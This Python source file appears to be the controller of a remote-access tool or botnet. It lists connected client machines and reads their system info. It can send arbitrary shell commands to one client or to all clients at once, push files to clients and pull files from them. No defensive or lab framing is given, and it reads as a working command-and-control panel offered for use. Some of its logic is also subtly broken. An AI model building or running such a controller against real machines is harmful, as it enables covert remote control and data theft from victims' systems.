#!/usr/bin/python3
import socket 
import threading
import concurrent.futures
import time
import os

import global_variables as gv
import broadcast_handler


def parse_command(command):

	gv.SENDING_BROADCAST = False
	if command == "help":
		show_help()

	elif command == "update_system_info":
		show_clients()
		update_system_info()


	elif command == "clients":
	 	show_clients()
		 

	elif command == "sys_info":
		show_clients()
		client_id = get_client_id()
		request_client_info(gv.CLIENTS[client_id]['client'])
	
	elif command == "bc":
		broadcast_handler.bc_help_menu()
		broadcast_handler.interactive_bc_menu()


	elif command == "active_session":
		print('Active Session:' , gv.ACTIVE_SESSION)
		print('You can choose a client to interact with from list below')
		print('Or you can enter -1 to interact with all clients')
		show_clients()
		gv.ACTIVE_SESSION = get_client_id()


	elif command == "run":
		if(len(gv.CLIENTS) <= 0):
			print('No client avaiable')
			return
		print('command execution mode')
		user_input = ''	
		while True:
			user_input = input('\tEnter Command>')	
			if(user_input == 'END'):
				break
				
			if(str(bytes(user_input, 'utf-8')) == "b''"): 
				continue
			if (gv.ACTIVE_SESSION == -1):
				send_to_all(user_input)
			else:
				print(gv.ACTIVE_SESSION)
				send_to_client(gv.ACTIVE_SESSION, user_input)


	elif command == "upload":
		user_input = "b''"
		while(user_input == "b''"):
			user_input = input('\tSource path>')
			if(str(bytes(user_input, 'utf-8')) == "b''"): continue
			if(not os.path.isfile(user_input)):
				print('File does not exist:', user_input)
				user_input = "b''"
				continue
			else:
				break
		src = user_input
		user_input = "b''"

		while(user_input == "b''"):
			user_input = input('\tDestination path>')
			if(str(bytes(user_input, 'utf-8')) == "b''"): continue
		des = user_input
		client_id = get_client_id()
		send_to_client(client_id, '__up')
		print(src, des)
		send_file(client_id, src, des)

	elif command == "download":
		user_input = "b''"
		while(user_input == "b''"):
			user_input = input('\tSource path>')
			if(str(bytes(user_input, 'utf-8')) == "b''"): continue
		src = user_input

		user_input = "b''"
		while(user_input == "b''"):
			user_input = input('\tDestination path>')
			if(str(bytes(user_input, 'utf-8')) == "b''"): continue
		des = user_input
		
		client_id = get_client_id()
		send_to_client(client_id, '__down')
		print(src, des)
		get_file(client_id, src, des)


	else:
		print('Command not exist. use help to display help menu')
	print('')




def send_file(client_id, src, des):
	print('Sending file {} to {}'.format(src, client_id))
	with open(src, 'rb') as file:
		file_byte = file.read()
		length =  len(file_byte)
		print('Length is {}.'.format(length))
		client = gv.CLIENTS[client_id]['client']
		print("Sending Des")
		send_to_client(client_id, des)
		print("Sending Length")
		send_to_client(client_id, length)
		print("Sending File")
		client.send(file_byte)
	print('File has been sent successfully.')


def get_file(client_id, src, des):
	print('Downloading file {} from {}'.format(src, client_id))
	client = gv.CLIENTS[client_id]['client']
	# Send to check if exist
	client.send(bytes(src,'utf-8'))
	# Receive file size
	# -1 means file does not exist
	length = client.recv(16)
	# perecent = length / 100
	if(length == -1):
		print('File does not exist')
		return
	# Request for file
	print('send request for file with {}'.format(length))
	client.send(bytes("OK",'utf-8'))
	data = b''
	print('opening file')
	file = open(des, 'wb')
	print('receiving file')
	length = int(length.decode('utf-8'))
	while len(data) < length:
		to_read = length - len(data)
		data += client.recv(
			4096 if to_read > 4096 else to_read)
	file.write(data)						
	print(str(file) , "Received")
	file.close()



def send_to_all(command):
	print('Active Session is -1. Sending to all clients')
	i = 0
	my_bytes = bytes(command, 'utf-8')
	remove_list = []
	for client in gv.CLIENTS:
		print('')
		client['client'].send(my_bytes)
		output_bytes = client['client'].recv(32768)
		output = output_bytes.decode('utf-8')[8:]
		if(output == ''):
			print('client %s disconnected. Addedto remove list.' % i)
			remove_list.append(gv.CLIENTS[i])
		i = i + 1
		print(output)
		print('')
	print('')
	if (len(remove_list) > 0):
		print('Removing closed sessions...')
		for c in remove_list:
			gv.CLIENTS.remove(c)
		print('Active Session set to -1')
		gv.ACTIVE_SESSION = -1


def send_to_client(client_id, command):
	command = str(command)
	my_bytes = bytes(command, 'utf-8')
	print('Sending to client', client_id)
	if(client_id >= len(gv.CLIENTS)):
		print('Client does not exist. returning')
		print('')
		return
	active_client = gv.CLIENTS[client_id]['client']
	active_client.send(my_bytes)
	output_bytes = active_client.recv(1024)
	output = output_bytes.decode('utf-8')
	if(output == ''):
		print('client %s disconnected. Removing...' % client_id)
		gv.CLIENTS.remove(gv.CLIENTS[client_id])
		print('Active Session set to -1')
		gv.ACTIVE_SESSION = -1
	print(output)



def request_client_info(client):
	my_bytes = bytes('sys_info','utf-8')
	client.send(my_bytes)
	output = client.recv(1024).decode('utf-8')
	print("sys_info result:", output)
	return output


def update_system_info():
	client_id = get_client_id()		
	gv.CLIENTS[client_id]['client_info'] = request_client_info(gv.CLIENTS[client_id]['client'])


def get_client_id():
	client_id = input('\tEnter Client ID>')
	if(str(bytes(client_id, 'utf-8')) == "b''"): 
		print('returning')
		return

	clients_count = len(gv.CLIENTS)
	if int(client_id) > clients_count or int(client_id) < 0:
		print("ERROR: CLient does not exist.")
		return -1
	return int(client_id)


def show_clients():
	i = 0
	print('')
	print('List of Clients:')
	print('=====================================================')
	for client in gv.CLIENTS:
		print('ClientID:', i)
		print('Client Address:', client['address'])
		print('Client INFO:', client['client_info'])
		print('-----------------------------------------------------')
		i = i + 1
	print('')


def show_help():
	print("")
	print("Help Menu")
	print("----------------------------------------------------------")
	print("help \t\t - Show this menu")
	print("active_session \t - Set or get active sessions")
	print("clients \t - Display clients list")
	print("sys_info \t - Display system information of a client")
	print("update_sys_info \t - Update system information of a client")
	print("bc \t\t - Configure network broadcast massage")
	print("run \t\t - Execute command in client systems")
	print("")
